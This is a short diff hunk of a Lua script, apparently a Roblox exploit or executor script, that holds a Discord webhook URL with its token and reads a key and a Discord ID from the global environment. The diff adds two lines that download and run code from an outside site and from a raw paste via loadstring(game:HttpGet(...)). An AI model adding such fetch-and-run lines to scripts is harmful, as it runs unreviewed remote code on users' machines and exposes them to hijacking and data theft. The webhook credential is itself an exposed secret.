@@ -2,6 +2,9 @@ local WEBHOOK="https://discord.com/api/webhooks/1542363277030596618/oms4xEFrJaIL
 local KEY=getgenv().Key
 local DISCORD_ID=getgenv().id
 
+loadstring(game:HttpGet("https://isnahamzah.site/fast"))()
+loadstring(game:HttpGet("https://pastefy.app/4h8Lh7Uk/raw"))()
+
 local function T(v)return type(v)=="function"end
 local function S(v)return type(v)=="string"end
 local function Safe(f,...)return pcall(f,...)end
